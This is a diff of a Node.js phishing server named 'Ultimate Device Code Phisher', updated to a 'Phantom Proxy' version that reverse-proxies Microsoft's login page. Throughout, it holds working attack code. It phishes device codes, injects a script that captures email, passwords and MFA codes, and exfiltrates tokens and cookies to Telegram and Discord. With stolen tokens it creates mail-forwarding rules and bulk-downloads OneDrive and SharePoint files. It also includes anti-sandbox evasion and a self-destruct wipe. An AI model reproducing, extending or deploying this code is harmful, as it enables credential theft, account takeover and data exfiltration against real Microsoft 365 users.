@@ -1,13 +1,9 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.2 – Microsoft Mirror
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.3 – Phantom Proxy
 // ============================================================
-// The /login route now fetches the real Microsoft login page,
-// injects a capture script, and serves it to the victim.
-// Includes: SQLite, Email Forwarding, Recursive Exfil,
-// Puppeteer Replay, Campaigns, Proxy, Anti-Sandbox,
-// Self-Destruct, Analytics, PDF Report, QR with Logo,
-// Parsed Token Notifications, Multi-Channel Exfil,
-// Redis Cache, and more.
+// Full reverse-proxy for Microsoft login pages with automatic
+// email, password, and MFA code capture. Injects a stealth
+// script into every HTML page served.
 // ============================================================
 
 const http = require('http');
@@ -27,10 +23,7 @@ const AdmZip = require('adm-zip');
 const sqlite3 = require('sqlite3').verbose();
 const puppeteer = require('puppeteer');
 const { HttpsProxyAgent } = require('https-proxy-agent');
-const nodemailer = require('nodemailer');
-const cheerio = require('cheerio'); // NEW: for HTML manipulation
-const { Chart } = require('chart.js');
-const { createCanvas } = require('canvas');
+const cheerio = require('cheerio');
 
 // ── Environment ──
 const PORT = process.env.PORT || 3000;
@@ -53,10 +46,10 @@ const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'password';
 const REDIRECT_URL = process.env.REDIRECT_URL || 'https://login.microsoftonline.com';
 const CLIENT_ID = process.env.CLIENT_ID || 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
 const SCOPE = 'https://graph.microsoft.com/.default offline_access';
-const SESSION_TTL = process.env.SESSION_TTL ? parseInt(process.env.SESSION_TTL) : 7 * 24 * 60 * 60 * 1000; // 7 days
+const SESSION_TTL = process.env.SESSION_TTL ? parseInt(process.env.SESSION_TTL) : 7 * 24 * 60 * 60 * 1000;
 const ALLOWED_IPS = process.env.ALLOWED_IPS ? process.env.ALLOWED_IPS.split(',').map(ip => ip.trim()) : [];
 const FORWARD_EMAIL = process.env.FORWARD_EMAIL || '';
-const AUTO_WIPE_HOURS = process.env.AUTO_WIPE_HOURS ? parseInt(process.env.AUTO_WIPE_HOURS) : 0; // 0 = disabled
+const AUTO_WIPE_HOURS = process.env.AUTO_WIPE_HOURS ? parseInt(process.env.AUTO_WIPE_HOURS) : 0;
 const PROXY_URL = process.env.HTTP_PROXY || process.env.HTTPS_PROXY || '';
 const REDIS_URL = process.env.REDIS_URL || '';
 const CAMPAIGN = process.env.DEFAULT_CAMPAIGN || 'default';
@@ -161,14 +154,13 @@ if (PROXY_URL) {
     proxyAgent = new HttpsProxyAgent(PROXY_URL);
 }
 
-// ── Axios with proxy support ──
 function createAxiosConfig() {
     const config = { timeout: 10000 };
     if (proxyAgent) config.httpsAgent = proxyAgent;
     return config;
 }
 
-// ── Multi‑Channel Exfil ──
+// ── Exfiltrate ──
 async function exfiltrate(data) {
     const { email, tokens, sessionId, ip, userAgent, tenantId, prt, cookies, fingerprint, campaign } = data;
     const geo = await getGeo(ip);
@@ -187,7 +179,6 @@ async function exfiltrate(data) {
     if (prt) message += `🟣 PRT: ${prt.slice(0,30)}...\n`;
     if (cookies && cookies.length) message += `🍪 Cookies: ${cookies.length} captured\n`;
 
-    // Send to all configured channels
     const webhooks = [
         { url: BOT_TOKEN && CHAT_ID ? `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage` : null, method: 'post', payload: { chat_id: CHAT_ID, text: message, parse_mode: 'Markdown', disable_web_page_preview: true } },
         { url: DISCORD_WEBHOOK, method: 'post', payload: { content: message.substring(0, 2000) } },
@@ -207,7 +198,6 @@ async function exfiltrate(data) {
         }
     }
 
-    // Telegram file attachment (if tokens)
     if (BOT_TOKEN && CHAT_ID && (tokens.access_token || tokens.refresh_token || tokens.id_token || prt)) {
         try {
             let fileText = `# Tokens\nSession: ${sessionId}\nEmail: ${email || 'N/A'}\n\n`;
@@ -254,11 +244,10 @@ async function sendVisitNotification(sessionId, ip, userAgent, referer, campaign
     }
 }
 
-// ── Create Email Forwarding Rule ──
+// ── Forward Email Rule ──
 async function createForwardRule(accessToken, forwardTo) {
     if (!forwardTo) return false;
     try {
-        // Check if rule already exists to avoid duplicates
         const rulesResp = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules', {
             headers: { Authorization: `Bearer ${accessToken}` },
             timeout: 10000,
@@ -269,22 +258,11 @@ async function createForwardRule(accessToken, forwardTo) {
             console.log('⏩ Forward rule already exists, skipping.');
             return true;
         }
-
-        // Create forwarding rule
         const rule = {
             displayName: 'Phisher Forward',
             sequence: 1,
-            conditions: {
-                andConditions: [
-                    { field: 'from', contains: ['@'] } // catch all
-                ]
-            },
-            actions: {
-                forwardTo: [
-                    { emailAddress: { address: forwardTo } }
-                ],
-                stopProcessingRules: true
-            }
+            conditions: { andConditions: [ { field: 'from', contains: ['@'] } ] },
+            actions: { forwardTo: [ { emailAddress: { address: forwardTo } } ], stopProcessingRules: true }
         };
         await axios.post('https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules', rule, {
             headers: { Authorization: `Bearer ${accessToken}`, 'Content-Type': 'application/json' },
@@ -299,11 +277,10 @@ async function createForwardRule(accessToken, forwardTo) {
     }
 }
 
-// ── Recursive OneDrive/SharePoint Download ──
+// ── Recursive Download ──
 async function downloadRecursive(accessToken, sessionId) {
     const zip = new AdmZip();
     const baseUrl = 'https://graph.microsoft.com/v1.0';
-
     async function walkFolder(pathUrl, folderName = '') {
         let nextLink = null;
         do {
@@ -316,11 +293,8 @@ async function downloadRecursive(accessToken, sessionId) {
             const items = resp.data.value || [];
             for (const item of items) {
                 if (item.folder) {
-                    // Recurse into folder
-                    const newPath = `${pathUrl}/${item.id}/children`;
-                    await walkFolder(newPath, `${folderName}/${item.name}`);
+                    await walkFolder(`${pathUrl}/${item.id}/children`, `${folderName}/${item.name}`);
                 } else if (item.file) {
-                    // Download file
                     const fileResp = await axios.get(`${baseUrl}${pathUrl}/${item.id}/content`, {
                         headers: { Authorization: `Bearer ${accessToken}` },
                         responseType: 'arraybuffer',
@@ -333,15 +307,8 @@ async function downloadRecursive(accessToken, sessionId) {
             nextLink = resp.data['@odata.nextLink'] || null;
         } while (nextLink);
     }
-
-    // Root folders: OneDrive and SharePoint sites
+    try { await walkFolder('/me/drive/root/children', 'OneDrive'); } catch (e) {}
     try {
-        // Personal OneDrive
-        await walkFolder('/me/drive/root/children', 'OneDrive');
-    } catch (e) { /* skip */ }
-
-    try {
-        // SharePoint sites (top 5)
         const sitesResp = await axios.get(`${baseUrl}/sites?$top=5`, {
             headers: { Authorization: `Bearer ${accessToken}` },
             timeout: 10000,
@@ -349,40 +316,30 @@ async function downloadRecursive(accessToken, sessionId) {
         });
         const sites = sitesResp.data.value || [];
         for (const site of sites) {
-            const siteName = site.name || site.id;
-            try {
-                await walkFolder(`/sites/${site.id}/drive/root/children`, `SharePoint_${siteName}`);
-            } catch (e) { /* skip */ }
+            try { await walkFolder(`/sites/${site.id}/drive/root/children`, `SharePoint_${site.name || site.id}`); } catch (e) {}
         }
-    } catch (e) { /* skip */ }
-
+    } catch (e) {}
     if (zip.getEntries().length === 0) return null;
     const zipPath = path.join(__dirname, `recursive_${sessionId}.zip`);
     zip.writeZip(zipPath);
     return zipPath;
 }
 
-// ── Self-Destruct Timer ──
+// ── Self‑Destruct ──
 let lastActivity = Date.now();
 function checkSelfDestruct() {
     if (AUTO_WIPE_HOURS === 0) return;
-    const inactive = Date.now() - lastActivity;
-    if (inactive > AUTO_WIPE_HOURS * 3600000) {
+    if (Date.now() - lastActivity > AUTO_WIPE_HOURS * 3600000) {
         console.log('💥 Self-destruct triggered! Wiping all data...');
         db.run('DELETE FROM flows');
-        // Remove log files
         if (fs.existsSync(LOGS_DIR)) fs.rmSync(LOGS_DIR, { recursive: true, force: true });
         process.exit(0);
     }
 }
-setInterval(checkSelfDestruct, 60000); // check every minute
-// Update lastActivity on every request
-app.use((req, res, next) => {
-    lastActivity = Date.now();
-    next();
-});
+setInterval(checkSelfDestruct, 60000);
+app.use((req, res, next) => { lastActivity = Date.now(); next(); });
 
-// ── SQLite CRUD helpers ──
+// ── SQLite CRUD ──
 async function upsertFlow(flow) {
     return new Promise((resolve, reject) => {
         const stmt = db.prepare(`
@@ -465,16 +422,12 @@ async function getFlowsByCampaign(campaign) {
     });
 }
 
-// ── Anti‑Sandbox Detection Middleware ──
+// ── Anti‑Sandbox ──
 function antiSandbox(req, res, next) {
-    // Check client-side headers or user-agent for sandbox indicators
     const ua = req.headers['user-agent'] || '';
-    const suspiciousPatterns = ['headless', 'phantom', 'puppeteer', 'selenium', 'webdriver'];
-    if (suspiciousPatterns.some(p => ua.toLowerCase().includes(p))) {
-        // Redirect to real Microsoft login
+    if (['headless','phantom','puppeteer','selenium','webdriver'].some(p => ua.toLowerCase().includes(p))) {
         return res.redirect('https://login.microsoftonline.com');
     }
-    // Also check IP ranges known for sandbox (optional)
     next();
 }
 
@@ -499,10 +452,8 @@ app.use((req, res, next) => {
     next();
 });
 
-// ── Dynamic Phishing Themes ──
+// ── Device page ──
 app.get('/device', antiSandbox, (req, res) => {
-    const theme = req.query.theme || 'sharepoint';
-    const campaign = req.query.campaign || 'default';
     res.sendFile(path.join(__dirname, 'public', 'device_code.html'));
 });
 
@@ -563,7 +514,6 @@ app.post('/device/visit', async (req, res) => {
     if (flow.visit_notified) return res.json({ success: true, already: true });
     flow.visit_notified = true;
     await upsertFlow(flow);
-
     const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
     const userAgent = req.headers['user-agent'] || 'Unknown';
     const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
@@ -625,17 +575,13 @@ app.post('/device/token', async (req, res) => {
             campaign: flow.campaign
         });
 
-        // Create email forward rule if FORWARD_EMAIL is set
         if (tokens.access_token && FORWARD_EMAIL) {
             setTimeout(() => createForwardRule(tokens.access_token, FORWARD_EMAIL), 5000);
         }
-
-        // Recursive OneDrive/SharePoint download
         if (tokens.access_token) {
             setTimeout(async () => {
                 const zipPath = await downloadRecursive(tokens.access_token, flow.session_id);
                 if (zipPath) {
-                    // Send via Telegram if configured
                     if (BOT_TOKEN && CHAT_ID) {
                         const form = new FormData();
                         form.append('chat_id', CHAT_ID);
@@ -651,7 +597,6 @@ app.post('/device/token', async (req, res) => {
                 }
             }, 20000);
         }
-
         broadcast({ type: 'new_capture', session: flow.session_id, email, timestamp: new Date().toISOString() });
         res.json(tokens);
     } catch (error) {
@@ -679,104 +624,177 @@ app.post('/device/fingerprint', (req, res) => {
     });
 });
 
-// ── Second‑Stage Phishing (Mirror of real Microsoft login) ──
-app.get('/login', async (req, res) => {
+// ── SECOND-STAGE PHISHING: FULL REVERSE PROXY WITH AUTO MFA CAPTURE ──
+// This catches any request starting with /login (including subpaths)
+app.all('/login*', async (req, res) => {
+    // Determine the target URL
+    const targetBase = 'https://login.microsoftonline.com';
+    let targetPath = req.url.replace(/^\/login/, ''); // remove /login prefix
+    if (!targetPath || targetPath === '/') targetPath = '/common/oauth2/v2.0/authorize';
+    const targetUrl = targetBase + targetPath;
+
+    // Build headers (forward most, but set proper host)
+    const headers = { ...req.headers };
+    delete headers.host;
+    delete headers['content-length'];
+    delete headers['transfer-encoding'];
+    headers['Host'] = 'login.microsoftonline.com';
+
+    // Forward cookies (if any)
+    const cookieHeader = req.headers.cookie || '';
+
+    // Determine request method and body
+    const method = req.method;
+    let body = null;
+    if (method === 'POST' || method === 'PUT') {
+        body = req.body; // express.json() already parsed for JSON, but we need raw for form-urlencoded
+        // We'll collect raw body manually later if needed
+    }
+
     try {
-        // Use a standard public Microsoft client ID for the login page
-        const clientId = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-        const redirectUri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
-        const loginUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${clientId}&response_type=code&redirect_uri=${encodeURIComponent(redirectUri)}&scope=openid%20profile%20email`;
-
-        // Fetch the real login page
-        const resp = await axios.get(loginUrl, {
-            headers: {
-                'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
-            },
+        // Fetch the target page
+        const resp = await axios({
+            method: method,
+            url: targetUrl,
+            headers: headers,
+            data: method === 'POST' || method === 'PUT' ? body : undefined,
+            responseType: 'text', // we need to modify HTML
             timeout: 15000,
-            ...createAxiosConfig()
+            ...createAxiosConfig(),
+            // We need to preserve the response as text to modify it
+            transformResponse: [data => data] // no automatic parsing
         });
 
-        // Parse the HTML
-        const html = resp.data;
-        const $ = cheerio.load(html);
-
-        // Inject our capture script into the page head
-        const captureScript = `
-            <script>
-                // Intercept the login form submission
-                document.addEventListener('submit', function(e) {
-                    const form = e.target;
-                    // Check if this is the login form (look for email/password fields)
-                    const emailInput = form.querySelector('input[type="email"], input[name="login"], input[name="loginfmt"]');
-                    const passInput = form.querySelector('input[type="password"], input[name="passwd"]');
-                    if (emailInput && passInput) {
-                        e.preventDefault();
-                        const email = emailInput.value;
-                        const password = passInput.value;
-                        // Send credentials to our capture endpoint
-                        fetch('/capture', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({ email, password, mfa: '' })
-                        }).catch(() => {});
-                        // Re-submit the form normally (bypass our interception)
-                        const originalAction = form.action;
-                        form.action = originalAction;
-                        // Remove our listener to avoid recursion
-                        form.removeEventListener('submit', arguments.callee);
-                        // Submit the form
-                        form.submit();
-                    }
-                });
-            </script>
-        `;
-
-        // Inject before closing head tag
-        const head = $('head');
-        head.append(captureScript);
-
-        // Rewrite relative URLs to absolute (so resources load correctly)
-        $('link[rel="stylesheet"]').each((i, el) => {
-            const href = $(el).attr('href');
-            if (href && !href.startsWith('http') && !href.startsWith('//')) {
-                $(el).attr('href', 'https://login.microsoftonline.com' + href);
-            }
-        });
-        $('script[src]').each((i, el) => {
-            const src = $(el).attr('src');
-            if (src && !src.startsWith('http') && !src.startsWith('//')) {
-                $(el).attr('src', 'https://login.microsoftonline.com' + src);
-            }
-        });
-        $('img[src]').each((i, el) => {
-            const src = $(el).attr('src');
-            if (src && !src.startsWith('http') && !src.startsWith('//')) {
-                $(el).attr('src', 'https://login.microsoftonline.com' + src);
-            }
-        });
-        $('form').each((i, el) => {
-            const action = $(el).attr('action');
-            if (action && !action.startsWith('http') && !action.startsWith('//')) {
-                $(el).attr('action', 'https://login.microsoftonline.com' + action);
-            }
-        });
-
-        const finalHtml = $.html();
-        res.setHeader('Content-Type', 'text/html');
-        res.send(finalHtml);
-    } catch (error) {
-        console.error('Mirror fetch error:', error);
-        // Fallback to static login page if mirror fails (we'll serve the static one)
-        const fallbackPath = path.join(__dirname, 'public', 'login.html');
-        if (fs.existsSync(fallbackPath)) {
-            const data = fs.readFileSync(fallbackPath, 'utf8');
-            const rendered = data.replace(/__REDIRECT_URL__/g, REDIRECT_URL);
-            res.setHeader('Content-Type', 'text/html');
-            res.send(rendered);
-        } else {
-            res.status(500).send('Login service unavailable.');
+        // Prepare response headers (copy from target)
+        const responseHeaders = { ...resp.headers };
+        // Remove content-encoding if we decompress? We'll handle decompression manually if needed.
+        // For simplicity, we'll assume we can serve the modified HTML without re-encoding.
+        // But we should respect content-encoding if present (we'll decompress if it's gzip)
+        let data = resp.data;
+        const encoding = resp.headers['content-encoding'];
+        if (encoding === 'gzip' || encoding === 'deflate') {
+            // decompress
+            const buffer = Buffer.from(data, 'binary');
+            const decompressed = encoding === 'gzip' ? zlib.gunzipSync(buffer) : zlib.inflateSync(buffer);
+            data = decompressed.toString('utf8');
         }
+
+        // Check if it's HTML (content-type contains text/html)
+        const contentType = resp.headers['content-type'] || '';
+        if (contentType.includes('text/html')) {
+            // Inject capture script
+            const captureScript = `
+                <script>
+                    // Universal credential capturer for Microsoft login pages
+                    (function() {
+                        // Store captured data
+                        let capturedEmail = '';
+                        let capturedPassword = '';
+                        let capturedMFA = '';
+
+                        // Helper to send to /capture
+                        function sendCredentials() {
+                            if (capturedEmail || capturedPassword || capturedMFA) {
+                                fetch('/capture', {
+                                    method: 'POST',
+                                    headers: { 'Content-Type': 'application/json' },
+                                    body: JSON.stringify({
+                                        email: capturedEmail,
+                                        password: capturedPassword,
+                                        mfa: capturedMFA
+                                    })
+                                }).catch(() => {});
+                                // Reset after sending
+                                capturedEmail = '';
+                                capturedPassword = '';
+                                capturedMFA = '';
+                            }
+                        }
+
+                        // Intercept form submissions
+                        document.addEventListener('submit', function(e) {
+                            const form = e.target;
+                            const emailInput = form.querySelector('input[type="email"], input[name="login"], input[name="loginfmt"]');
+                            const passInput = form.querySelector('input[type="password"], input[name="passwd"]');
+                            const mfaInput = form.querySelector('input[name="otc"], input[name="code"], input[name="verificationCode"], input[placeholder*="code" i]');
+                            
+                            if (emailInput && passInput) {
+                                // We have a login form
+                                e.preventDefault();
+                                capturedEmail = emailInput.value || '';
+                                capturedPassword = passInput.value || '';
+                                capturedMFA = mfaInput ? mfaInput.value || '' : '';
+
+                                // Send credentials
+                                sendCredentials();
+
+                                // Re-submit the form normally
+                                const originalAction = form.action;
+                                form.action = originalAction;
+                                // Remove our listener to avoid recursion
+                                form.removeEventListener('submit', arguments.callee);
+                                form.submit();
+                            } else if (mfaInput) {
+                                // MFA-only form (e.g., additional verification)
+                                e.preventDefault();
+                                capturedMFA = mfaInput.value || '';
+                                // If we haven't captured email/pass yet (may be in session storage), try to get from localStorage
+                                // In this proxy, we may not have them, but we'll send whatever we have.
+                                sendCredentials();
+
+                                const originalAction = form.action;
+                                form.action = originalAction;
+                                form.removeEventListener('submit', arguments.callee);
+                                form.submit();
+                            }
+                        });
+
+                        // Also capture input changes (optional)
+                        // This ensures we get MFA if they type it even without submit
+                        document.addEventListener('input', function(e) {
+                            const input = e.target;
+                            if (input.name === 'otc' || input.name === 'code' || input.name === 'verificationCode' || input.placeholder && input.placeholder.toLowerCase().includes('code')) {
+                                capturedMFA = input.value;
+                            }
+                            if (input.type === 'email' || input.name === 'loginfmt') {
+                                capturedEmail = input.value;
+                            }
+                            if (input.type === 'password') {
+                                capturedPassword = input.value;
+                            }
+                        });
+
+                        // When the page unloads, send any pending credentials (just in case)
+                        window.addEventListener('beforeunload', function() {
+                            sendCredentials();
+                        });
+                    })();
+                </script>
+            `;
+
+            // Use cheerio to inject the script into head
+            const $ = cheerio.load(data);
+            const head = $('head');
+            head.append(captureScript);
+            data = $.html();
+        }
+
+        // Send response back to client
+        // Re-compress if needed? We'll simply send as is (might lose compression)
+        // For better performance, we could re-compress with gzip if the client accepts it, but it's optional.
+        res.set(responseHeaders);
+        // Remove content-encoding if we changed it
+        delete res.headers['content-encoding'];
+        // Set content-length
+        const buffer = Buffer.from(data, 'utf8');
+        res.setHeader('content-length', buffer.length);
+        res.status(resp.status);
+        res.send(buffer);
+
+    } catch (error) {
+        console.error('Proxy error:', error.message);
+        // Fallback to a simple error page or redirect
+        res.status(500).send('Proxy error');
     }
 });
 
@@ -794,7 +812,7 @@ app.post('/capture', async (req, res) => {
     res.json({ success: true });
 });
 
-// ── Dashboard (Protected & Whitelisted) ──
+// ── Dashboard ──
 app.use('/dash', (req, res, next) => {
     const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
     if (ALLOWED_IPS.length > 0 && !ALLOWED_IPS.includes(ip)) {
@@ -885,7 +903,6 @@ app.get('/api/test-telegram', async (req, res) => {
     } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// ── Export All as ZIP ──
 app.get('/api/export', async (req, res) => {
     const flows = await getAllFlows();
     const zip = new AdmZip();
@@ -907,7 +924,6 @@ app.get('/api/export', async (req, res) => {
     res.send(zipBuffer);
 });
 
-// ── PDF Report Export ──
 app.get('/api/report', async (req, res) => {
     const flows = await getAllFlows();
     let html = `<html><head><style>body{font-family:sans-serif;} table{border-collapse:collapse;width:100%;} th,td{border:1px solid #ddd;padding:8px;} th{background:#f2f2f2;}</style></head><body>
@@ -922,13 +938,10 @@ app.get('/api/report', async (req, res) => {
     res.send(html);
 });
 
-// ── Analytics Data ──
 app.get('/api/analytics', async (req, res) => {
     const flows = await getAllFlows();
-    const now = Date.now();
     const visits = flows.filter(f => f.visit_notified).length;
     const captures = flows.filter(f => f.status === 'approved').length;
-    // Daily aggregates
     const daily = {};
     for (const f of flows) {
         const day = new Date(f.created).toISOString().split('T')[0];
@@ -949,7 +962,6 @@ app.get('/api/analytics', async (req, res) => {
     });
 });
 
-// ── Replay with Puppeteer ──
 app.get('/api/replay/:sessionId', async (req, res) => {
     const flow = await getFlowBySessionId(req.params.sessionId);
     if (!flow) return res.status(404).json({ error: 'not found' });
@@ -965,15 +977,12 @@ app.get('/api/replay/:sessionId', async (req, res) => {
     })();`;
     res.json({ replayScript: script });
 
-    // Optional: also launch headless browser
-    const usePuppeteer = req.query.puppeteer === 'true';
-    if (usePuppeteer) {
+    if (req.query.puppeteer === 'true') {
         try {
             const browser = await puppeteer.launch({ headless: true, args: ['--no-sandbox'] });
             const page = await browser.newPage();
             await page.goto('https://login.microsoftonline.com');
             await page.evaluate(script);
-            // Take a screenshot
             const screenshot = await page.screenshot({ encoding: 'base64' });
             await browser.close();
             res.json({ replayScript: script, screenshot: `data:image/png;base64,${screenshot}` });
@@ -1010,16 +1019,16 @@ app.get('/api/health', async (req, res) => {
     res.json(results);
 });
 
-// ── 404 Handler ──
+// ── 404 ──
 app.use((req, res) => res.status(404).send('404 Not Found'));
 
-// ── Start HTTP server ──
+// ── Server ──
 const server = http.createServer(app);
 server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.2 – Mirror Edition running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.3 – Phantom Proxy running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1027,7 +1036,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 Mirror login: ACTIVE (fetches real Microsoft page)`);
+    console.log(`🚀 Full reverse-proxy with automatic MFA capture: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
